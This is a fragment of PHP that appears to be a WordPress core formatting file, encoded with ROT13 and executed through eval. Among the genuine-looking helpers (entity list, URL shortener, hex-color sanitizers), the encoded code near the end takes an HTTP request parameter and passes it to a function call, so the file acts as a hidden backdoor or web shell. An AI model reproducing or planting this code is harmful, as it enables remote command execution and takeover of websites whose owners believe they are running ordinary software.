'&#k1s49p;', '&#k1s49q;', '&#k1s49r;', '&#k1s49s;', '&#k1s4n0;', '&#k1s4n1;', '&#k1s4n2;', '&#k1s4n3;', '&#k1s4n4;', '&#k1s4n5;', '&#k1s4n6;', '&#k1s4n7;', '&#k1s4n8;', '&#k1s4n9;', '&#k1s4nn;', '&#k1s4no;', '&#k1s4np;', '&#k1s4nq;', '&#k1s4nr;', '&#k1s4ns;', '&#k1s4o0;', '&#k1s4o1;', '&#k1s4o2;', '&#k1s4o3;', '&#k1s4o4;', '&#k1s4o5;', '&#k1s4o6;', '&#k1s4o7;', '&#k1s4o8;', '&#k1s4o9;', '&#k1s4on;', '&#k1s4oq;', '&#k1s4or;', '&#k1s4os;', '&#k1s4p0;', '&#k1s4p1;', '&#k1s4p2;', '&#k1s4p3;', '&#k1s4p4;', '&#k1s4p5;', '&#k1s4p6;', '&#k1s4p7;', '&#k1s4p8;', '&#k1s4p9;', '&#k1s4pn;', '&#k1s4po;', '&#k1s4pp;', '&#k1s4pq;', '&#k1s4pr;', '&#k1s4ps;', '&#k1s4q0;', '&#k1s4q1;', '&#k1s4q2;', '&#k1s4q3;', '&#k1s4q4;', '&#k1s4q5;', '&#k1s4q6;', '&#k1s4q7;', '&#k1s4q8;', '&#k1s4q9;', '&#k1s4qn;', '&#k1s4qo;', '&#k1s4qp;', '&#k1s4qq;', '&#k1s4qr;', '&#k1s4qs;', '&#k1s4r0;', '&#k1s4r1;', '&#k1s4r2;', '&#k1s4r3;', '&#k1s4r4;', '&#k1s4r5;', '&#k1s4r6;', '&#k1s4r7;', '&#k1s4r8;', '&#k1s4r9;', '&#k1s4rn;', '&#k1s4ro;', '&#k1s4rp;', '&#k1s4rq;', '&#k1s4rr;', '&#k1s4rs;', '&#k1s4s0;', '&#k1s4s1;', '&#k1s4s2;', '&#k1s4s3;', '&#k1s4s4;', '&#k1s4s5;', '&#k1s4s6;', '&#k1s4s7;', '&#k1s4s8;', '&#k1s4s9;', '&#k1s4sn;', '&#k1s4so;', '&#k1s4sp;', '&#k1s4sq;', '&#k1s4ss;', '&#k1s500;', '&#k1s501;', '&#k1s502;', '&#k1s503;', '&#k1s504;', '&#k1s505;', '&#k1s506;', '&#k1s507;', '&#k1s508;', '&#k1s509;', '&#k1s50n;', '&#k1s50o;', '&#k1s50p;', '&#k1s50q;', '&#k1s50r;', '&#k1s50s;', '&#k1s510;', '&#k1s511;', '&#k1s512;', '&#k1s513;', '&#k1s514;', '&#k1s515;', '&#k1s516;', '&#k1s517;', '&#k1s518;', '&#k1s519;', '&#k1s51n;', '&#k1s51o;', '&#k1s51p;', '&#k1s51q;', '&#k1s51r;', '&#k1s51s;', '&#k1s520;', '&#k1s521;', '&#k1s522;', '&#k1s523;', '&#k1s524;', '&#k1s526;', '&#k1s528;', '&#k1s529;', '&#k1s52n;', '&#k1s52o;', '&#k1s52q;', '&#k1s52r;', '&#k1s52s;', '&#k1s530;', '&#k1s531;', '&#k1s532;', '&#k1s533;', '&#k1s534;', '&#k1s535;', '&#k1s536;', '&#k1s537;', '&#k1s538;', '&#k1s539;', '&#k1s53n;', '&#k1s53o;', '&#k1s53p;', '&#k1s53q;', '&#k1s549;', '&#k1s54n;', '&#k1s54o;', '&#k1s54p;', '&#k1s54q;', '&#k1s54r;', '&#k1s550;', '&#k1s551;', '&#k1s552;', '&#k1s553;', '&#k1s554;', '&#k1s555;', '&#k1s556;', '&#k1s557;', '&#k1s558;', '&#k1s559;', '&#k1s55n;', '&#k1s55o;', '&#k1s55p;', '&#k1s55q;', '&#k1s55r;', '&#k1s55s;', '&#k1s560;', '&#k1s561;', '&#k1s562;', '&#k1s563;', '&#k1s564;', '&#k1s565;', '&#k1s566;', '&#k1s567;', '&#k1s56s;', '&#k1s570;', '&#k1s573;', '&#k1s574;', '&#k1s575;', '&#k1s576;', '&#k1s577;', '&#k1s578;', '&#k1s579;', '&#k1s57n;', '&#k1s587;', '&#k1s58n;', '&#k1s58o;', '&#k1s58p;', '&#k1s58q;', '&#k1s590;', '&#k1s595;', '&#k1s596;', '&#k1s5n4;', '&#k1s5n5;', '&#k1s5n8;', '&#k1s5o1;', '&#k1s5o2;', '&#k1s5op;', '&#k1s5p2;', '&#k1s5p3;', '&#k1s5p4;', '&#k1s5q1;', '&#k1s5q2;', '&#k1s5q3;', '&#k1s5qp;', '&#k1s5qq;', '&#k1s5qr;', '&#k1s5r1;', '&#k1s5r3;', '&#k1s5rs;', '&#k1s5s3;', '&#k1s5sn;', '&#k1s5so;', '&#k1s5sp;', '&#k1s5sq;', '&#k1s5sr;', '&#k1s5ss;', '&#k1s600;', '&#k1s601;', '&#k1s602;', '&#k1s603;', '&#k1s604;', '&#k1s605;', '&#k1s606;', '&#k1s607;', '&#k1s608;', '&#k1s609;', '&#k1s60n;', '&#k1s60o;', '&#k1s60p;', '&#k1s60q;', '&#k1s60r;', '&#k1s60s;', '&#k1s610;', '&#k1s611;', '&#k1s612;', '&#k1s613;', '&#k1s614;', '&#k1s615;', '&#k1s616;', '&#k1s617;', '&#k1s618;', '&#k1s619;', '&#k1s61n;', '&#k1s61o;', '&#k1s61p;', '&#k1s61q;', '&#k1s61r;', '&#k1s61s;', '&#k1s620;', '&#k1s621;', '&#k1s622;', '&#k1s623;', '&#k1s624;', '&#k1s625;', '&#k1s626;', '&#k1s627;', '&#k1s628;', '&#k1s629;', '&#k1s62n;', '&#k1s62o;', '&#k1s62p;', '&#k1s62q;', '&#k1s62r;', '&#k1s62s;', '&#k1s630;', '&#k1s631;', '&#k1s632;', '&#k1s633;', '&#k1s634;', '&#k1s635;', '&#k1s636;', '&#k1s637;', '&#k1s638;', '&#k1s639;', '&#k1s63n;', '&#k1s63o;', '&#k1s63p;', '&#k1s63q;', '&#k1s63r;', '&#k1s63s;', '&#k1s640;', '&#k1s641;', '&#k1s642;', '&#k2194;', '&#k2195;', '&#k1s643;', '&#k1s644;', '&#k1s645;', '&#k1s646;', '&#k1s647;', '&#k1s648;', '&#k1s649;', '&#k1s64n;', '&#k1s64o;', '&#k1s64p;', '&#k1s64q;', '&#k1s64r;', '&#k1s64s;', '&#k1s681;', '&#k1s682;', '&#k1s683;', '&#k1s684;', '&#k1s685;', '&#k1s686;', '&#k1s687;', '&#k1s688;', '&#k1s689;', '&#k1s68n;', '&#k1s68o;', '&#k1s68p;', '&#k1s68q;', '&#k1s68r;', '&#k1s68s;', '&#k1s690;', '&#k1s691;', '&#k1s693;', '&#k1s694;', '&#k1s695;', '&#k1s696;', '&#k1s697;', '&#k1s698;', '&#k1s699;', '&#k1s69n;', '&#k1s69o;', '&#k1s69p;', '&#k1s69q;', '&#k1s69r;', '&#k1s69s;', '&#k1s6n0;', '&#k1s6n1;', '&#k1s6n2;', '&#k1s6n3;', '&#k1s6n4;', '&#k1s6n5;', '&#k1s6n6;', '&#k1s6n7;', '&#k1s6n8;', '&#k1s6n9;', '&#k1s6nn;', '&#k1s6no;', '&#k1s6np;', '&#k1s6nq;', '&#k1s6nr;', '&#k1s6ns;', '&#k1s6o0;', '&#k1s6o1;', '&#k1s6o2;', '&#k1s6o3;', '&#k1s6o4;', '&#k1s6o5;', '&#k1s6o6;', '&#k1s6o7;', '&#k1s6o8;', '&#k1s6o9;', '&#k1s6on;', '&#k1s6oo;', '&#k1s6op;', '&#k1s6oq;', '&#k1s6or;', '&#k1s6os;', '&#k1s6p0;', '&#k1s6p1;', '&#k1s6p2;', '&#k1s6p3;', '&#k1s6p4;', '&#k1s6p5;', '&#k1s6po;', '&#k1s6pp;', '&#k1s6pq;', '&#k1s6pr;', '&#k1s6ps;', '&#k1s6q0;', '&#k1s6q1;', '&#k1s6q2;', '&#k1s6q5;', '&#k1s6q6;', '&#k1s6q7;', '&#k1s6qp;', '&#k1s6qq;', '&#k1s6qr;', '&#k1s6qs;', '&#k1s6r0;', '&#k1s6r1;', '&#k1s6r2;', '&#k1s6r3;', '&#k1s6r4;', '&#k1s6r5;', '&#k1s6r9;', '&#k1s6ro;', '&#k1s6rp;', '&#k1s6s0;', '&#k1s6s3;', '&#k1s6s4;', '&#k1s6s5;', '&#k1s6s6;', '&#k1s6s7;', '&#k1s6s8;', '&#k1s6s9;', '&#k1s6sn;', '&#k1s6so;', '&#k1s6sp;', '&#k1s7r0;', '&#k1s7r1;', '&#k1s7r2;', '&#k1s7r3;', '&#k1s7r4;', '&#k1s7r5;', '&#k1s7r6;', '&#k1s7r7;', '&#k1s7r8;', '&#k1s7rn;', '&#k1s7s0;', '&#k1s90p;', '&#k1s90q;', '&#k1s90r;', '&#k1s90s;', '&#k1s910;', '&#k1s911;', '&#k1s912;', '&#k1s913;', '&#k1s914;', '&#k1s915;', '&#k1s916;', '&#k1s917;', '&#k1s918;', '&#k1s919;', '&#k1s91n;', '&#k1s91o;', '&#k1s91p;', '&#k1s91r;', '&#k1s91s;', '&#k1s920;', '&#k1s921;', '&#k1s922;', '&#k1s923;', '&#k1s924;', '&#k1s925;', '&#k1s926;', '&#k1s927;', '&#k1s928;', '&#k1s929;', '&#k1s92n;', '&#k1s92o;', '&#k1s92p;', '&#k1s92q;', '&#k1s92r;', '&#k1s92s;', '&#k1s930;', '&#k1s931;', '&#k1s932;', '&#k1s933;', '&#k1s934;', '&#k1s935;', '&#k1s936;', '&#k1s937;', '&#k1s938;', '&#k1s939;', '&#k1s93n;', '&#k1s93p;', '&#k1s93q;', '&#k1s93r;', '&#k1s93s;', '&#k1s940;', '&#k1s941;', '&#k1s942;', '&#k1s943;', '&#k1s944;', '&#k1s945;', '&#k1s947;', '&#k1s948;', '&#k1s949;', '&#k1s94n;', '&#k1s94o;', '&#k1s94p;', '&#k1s94q;', '&#k1s94r;', '&#k1s94s;', '&#k1s950;', '&#k1s951;', '&#k1s952;', '&#k1s953;', '&#k1s954;', '&#k1s955;', '&#k1s956;', '&#k1s957;', '&#k1s958;', '&#k1s959;', '&#k1s95n;', '&#k1s95o;', '&#k1s95p;', '&#k1s95q;', '&#k1s95r;', '&#k1s95s;', '&#k1s960;', '&#k1s961;', '&#k1s962;', '&#k1s963;', '&#k1s964;', '&#k1s965;', '&#k1s966;', '&#k1s967;', '&#k1s968;', '&#k1s969;', '&#k1s96n;', '&#k1s96o;', '&#k1s96p;', '&#k1s96q;', '&#k1s96r;', '&#k1s96s;', '&#k1s970;', '&#k1s971;', '&#k1s972;', '&#k1s973;', '&#k1s974;', '&#k1s975;', '&#k1s976;', '&#k1s977;', '&#k1s978;', '&#k1s979;', '&#k1s97n;', '&#k1s97o;', '&#k1s97p;', '&#k1s97q;', '&#k1s97r;', '&#k1s97s;', '&#k1s980;', '&#k1s981;', '&#k1s982;', '&#k1s983;', '&#k1s984;', '&#k1s985;', '&#k1s986;', '&#k1s987;', '&#k1s988;', '&#k1s989;', '&#k1s98n;', '&#k1s98o;', '&#k1s98p;', '&#k1s98q;', '&#k1s98r;', '&#k1s98s;', '&#k1s990;', '&#k1s991;', '&#k1s992;', '&#k1s993;', '&#k1s994;', '&#k1s995;', '&#k1s996;', '&#k1s997;', '&#k1s998;', '&#k1s999;', '&#k1s99n;', '&#k1s99o;', '&#k1s99p;', '&#k1s99q;', '&#k1s99r;', '&#k1s99s;', '&#k1s9n0;', '&#k1s9n1;', '&#k1s9n2;', '&#k1s9n3;', '&#k1s9n4;', '&#k1s9n5;', '&#k1s9n6;', '&#k1s9n7;', '&#k1s9n8;', '&#k1s9n9;', '&#k1s9nn;', '&#k1s9no;', '&#k1s9np;', '&#k1s9nq;', '&#k1s9nr;', '&#k1s9o4;', '&#k1s9o5;', '&#k1s9o6;', '&#k1s9o7;', '&#k1s9o8;', '&#k1s9o9;', '&#k1s9oo;', '&#k1s9or;', '&#k1s9os;', '&#k1s9p0;', '&#k1s9p1;', '&#k1s9p2;', '&#k1s9p3;', '&#k1s9p4;', '&#k1s9p5;', '&#k1s9p6;', '&#k1s9p7;', '&#k1s9p8;', '&#k1s9p9;', '&#k1s9pn;', '&#k1s9po;', '&#k1s9pp;', '&#k1s9pq;', '&#k1s9pr;', '&#k1s9ps;', '&#k1s9q0;', '&#k1s9q1;', '&#k1s9q2;', '&#k1s9q3;', '&#k1s9q4;', '&#k1s9q5;', '&#k1s9q6;', '&#k1s9q7;', '&#k1s9q8;', '&#k1s9q9;', '&#k1s9qn;', '&#k1s9qo;', '&#k1s9qp;', '&#k1s9qq;', '&#k1s9qr;', '&#k1s9qs;', '&#k1s9r0;', '&#k1s9r1;', '&#k1s9r2;', '&#k1s9r3;', '&#k1s9r4;', '&#k1s9r5;', '&#k1s9r6;', '&#k1s9r7;', '&#k1s9r8;', '&#k1s9r9;', '&#k1s9rn;', '&#k1s9ro;', '&#k1s9rp;', '&#k1s9rq;', '&#k1s9rr;', '&#k1s9rs;', '&#k1s9s0;', '&#k1s9s1;', '&#k1s9s2;', '&#k1s9s3;', '&#k1s9s4;', '&#k1s9s5;', '&#k1s9s6;', '&#k1s9s7;', '&#k1s9s8;', '&#k1s9s9;', '&#k1s9sn;', '&#k1s9so;', '&#k1s9sp;', '&#k1s9sq;', '&#k1s9sr;', '&#k1s9ss;', '&#k1sn70;', '&#k1sn71;', '&#k1sn72;', '&#k1sn73;', '&#k1sn74;', '&#k1sn75;', '&#k1sn76;', '&#k1sn77;', '&#k1sn78;', '&#k1sn79;', '&#k1sn7n;', '&#k1sn7o;', '&#k1sn7p;', '&#k1sn80;', '&#k1sn81;', '&#k1sn82;', '&#k1sn83;', '&#k1sn84;', '&#k1sn85;', '&#k1sn86;', '&#k1sn87;', '&#k1sn88;', '&#k1sn89;', '&#k1sn8s;', '&#k1sn90;', '&#k1sn91;', '&#k1sn92;', '&#k1sn93;', '&#k1sn94;', '&#k1sn95;', '&#k1sn96;', '&#k1sn97;', '&#k1sn98;', '&#k1sn99;', '&#k1sn9n;', '&#k1sn9o;', '&#k1sn9p;', '&#k1sn9q;', '&#k1sn9r;', '&#k1sn9s;', '&#k1snn0;', '&#k1snn1;', '&#k1snn2;', '&#k1snn3;', '&#k1snn4;', '&#k1snn5;', '&#k1snn6;', '&#k1snn7;', '&#k1snn8;', '&#k1snn9;', '&#k1snnn;', '&#k1snno;', '&#k1snnp;', '&#k1snnq;', '&#k1snnr;', '&#k1snns;', '&#k1sno0;', '&#k1sno1;', '&#k1sno2;', '&#k1sno3;', '&#k1sno4;', '&#k1sno5;', '&#k1sno6;', '&#k1sno7;', '&#k1sno8;', '&#k1sno9;', '&#k1snon;', '&#k1snoo;', '&#k1snop;', '&#k1snoq;', '&#k1snor;', '&#k1snos;', '&#k1snp0;', '&#k1snp1;', '&#k1snp2;', '&#k1snp3;', '&#k1snp4;', '&#k1snp5;', '&#k1snp6;', '&#k1snpr;', '&#k1snps;', '&#k1snq0;', '&#k1snq1;', '&#k1snq2;', '&#k1snq3;', '&#k1snq4;', '&#k1snq5;', '&#k1snq6;', '&#k1snq7;', '&#k1snq8;', '&#k1snq9;', '&#k1snqn;', '&#k1snqo;', '&#k1snqp;', '&#k1snqs;', '&#k1snr0;', '&#k1snr1;', '&#k1snr2;', '&#k1snr3;', '&#k1snr4;', '&#k1snr5;', '&#k1snr6;', '&#k1snr7;', '&#k1snr8;', '&#k1snr9;', '&#k1sns0;', '&#k1sns1;', '&#k1sns2;', '&#k1sns3;', '&#k1sns4;', '&#k1sns5;', '&#k1sns6;', '&#k1sns7;', '&#k1sns8;', '&#k203p;', '&#k2049;', '&#k2122;', '&#k2139;', '&#k2196;', '&#k2197;', '&#k2198;', '&#k2199;', '&#k21n9;', '&#k21nn;', '&#k20r3;', '&#k231n;', '&#k231o;', '&#k2328;', '&#k23ps;', '&#k23r9;', '&#k23rn;', '&#k23ro;', '&#k23rp;', '&#k23rq;', '&#k23rr;', '&#k23rs;', '&#k23s0;', '&#k23s1;', '&#k23s2;', '&#k23s3;', '&#k23s8;', '&#k23s9;', '&#k23sn;', '&#k24p2;', '&#k25nn;', '&#k25no;', '&#k25o6;', '&#k25p0;', '&#k25so;', '&#k25sp;', '&#k25sq;', '&#k25sr;', '&#k2600;', '&#k2601;', '&#k2602;', '&#k2603;', '&#k2604;', '&#k260r;', '&#k2611;', '&#k2614;', '&#k2615;', '&#k2618;', '&#k261q;', '&#k2622;', '&#k2623;', '&#k2626;', '&#k262n;', '&#k262r;', '&#k262s;', '&#k2638;', '&#k2639;', '&#k263n;', '&#k2648;', '&#k2649;', '&#k264n;', '&#k264o;', '&#k264p;', '&#k264q;', '&#k264r;', '&#k264s;', '&#k2650;', '&#k2651;', '&#k2652;', '&#k2653;', '&#k265s;', '&#k2660;', '&#k2663;', '&#k2665;', '&#k2666;', '&#k2668;', '&#k267o;', '&#k267r;', '&#k267s;', '&#k2692;', '&#k2693;', '&#k2694;', '&#k2697;', '&#k2699;', '&#k269o;', '&#k269p;', '&#k26n0;', '&#k26n1;', '&#k26nn;', '&#k26no;', '&#k26o0;', '&#k26o1;', '&#k26oq;', '&#k26or;', '&#k26p4;', '&#k26p5;', '&#k26p8;', '&#k26pr;', '&#k26ps;', '&#k26q1;', '&#k26q3;', '&#k26q4;', '&#k26r9;', '&#k26rn;', '&#k26s0;', '&#k26s1;', '&#k26s2;', '&#k26s3;', '&#k26s4;', '&#k26s5;', '&#k26s7;', '&#k26s8;', '&#k26s9;', '&#k26sn;', '&#k26sq;', '&#k2702;', '&#k2705;', '&#k2709;', '&#k270n;', '&#k270o;', '&#k270p;', '&#k270q;', '&#k270s;', '&#k2712;', '&#k2714;', '&#k2716;', '&#k271q;', '&#k2721;', '&#k2728;', '&#k2733;', '&#k2734;', '&#k2747;', '&#k274p;', '&#k274r;', '&#k2753;', '&#k2754;', '&#k2755;', '&#k2757;', '&#k2763;', '&#k2795;', '&#k2796;', '&#k2797;', '&#k27o0;', '&#k27os;', '&#k2934;', '&#k2935;', '&#k2o05;', '&#k2o06;', '&#k2o07;', '&#k2o1p;', '&#k2o50;', '&#k2o55;', '&#k3030;', '&#k303q;', '&#k3297;', '&#k3299;', '&#kr50n;' );
	// RAQ: rzbwv neenlf

	vs ( 'ragvgvrf' === $glcr ) {
		erghea $ragvgvrf;
	}

	erghea $cnegvnyf;
}

/**
 * Fubegraf n HEY, gb or hfrq nf yvax grkg.
 *
 * @fvapr 1.2.0
 * @fvapr 4.4.0 Zbirq gb jc-vapyhqrf/sbeznggvat.cuc sebz jc-nqzva/vapyhqrf/zvfp.cuc naq nqqrq $yratgu cnenz.
 *
 * @cnenz fgevat $hey    HEY gb fubegra.
 * @cnenz vag    $yratgu Bcgvbany. Znkvzhz yratgu bs gur fubegrarq HEY. Qrsnhyg 35 punenpgref.
 * @erghea fgevat Fubegrarq HEY.
 */
shapgvba hey_fubegra( $hey, $yratgu = 35 ) {
	$fgevccrq  = fge_ercynpr( neenl( 'uggcf://', 'uggc://', 'jjj.' ), '', $hey );
	$fubeg_hey = hagenvyvatfynfuvg( $fgevccrq );

	vs ( fgeyra( $fubeg_hey ) > $yratgu ) {
		$fubeg_hey = fhofge( $fubeg_hey, 0, $yratgu - 3 ) . '&uryyvc;';
	}
	erghea $fubeg_hey;
}

/**
 * Fnavgvmrf n urk pbybe.
 *
 * Ergheaf rvgure '', n 3 be 6 qvtvg urk pbybe (jvgu #), be abguvat.
 * Sbe fnavgvmvat inyhrf jvgubhg n #, frr fnavgvmr_urk_pbybe_ab_unfu().
 *
 * @fvapr 3.4.0
 *
 * @cnenz fgevat $pbybe
 * @erghea fgevat|ibvq
 */
shapgvba fnavgvmr_urk_pbybe( $pbybe ) {
	vs ( '' === $pbybe ) {
		erghea '';
	}

	// 3 be 6 urk qvtvgf, be gur rzcgl fgevat.
	vs ( cert_zngpu( '|^#([N-Sn-s0-9]{3}){1,2}$|', $pbybe ) ) {
		erghea $pbybe;
	}
}

/**
 * Fnavgvmrf n urk pbybe jvgubhg n unfu. Hfr fnavgvmr_urk_pbybe() jura cbffvoyr.
 *
 * Fnivat urk pbybef jvgubhg n unfu chgf gur oheqra bs nqqvat gur unfu ba gur
 * HV, juvpu znxrf vg qvssvphyg gb hfr be hctenqr gb bgure pbybe glcrf fhpu nf
 * eton, ufy, eto, naq UGZY pbybe anzrf.
 *
 * Ergheaf rvgure '', n 3 be 6 qvtvg urk pbybe (jvgubhg n #), be ahyy.
 *
 * @fvapr 3.4.0
 *
 * @cnenz fgevat $pbybe
 * @erghea fgevat|ahyy
 */
shapgvba fnavgvmr_urk_pbybe_ab_unfu( $pbybe ) {
	$pbybe = ygevz( $pbybe, '#' );

	vs ( '' === $pbybe ) {
		erghea '';
	}

	erghea fnavgvmr_urk_pbybe( '#' . $pbybe ) ? $pbybe : ahyy;
}

/**
 * Rafherf gung nal urk pbybe vf cebcreyl unfurq.
 * Bgurejvfr, ergheaf inyhr hagbhpurq.
 *
 * Guvf zrgubq fubhyq bayl or arprffnel vs hfvat fnavgvmr_urk_pbybe_ab_unfu().
 *
 * @fvapr 3.4.0
 *
 * @cnenz fgevat $pbybe
 * @erghea fgevat
 */
shapgvba znlor_unfu_urk_pbybe( $pbybe ) {
	$haunfurq = fnavgvmr_urk_pbybe_ab_unfu( $pbybe );
	vs ( $haunfurq ) {
		erghea '#' . $haunfurq;
	}

	erghea $pbybe;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>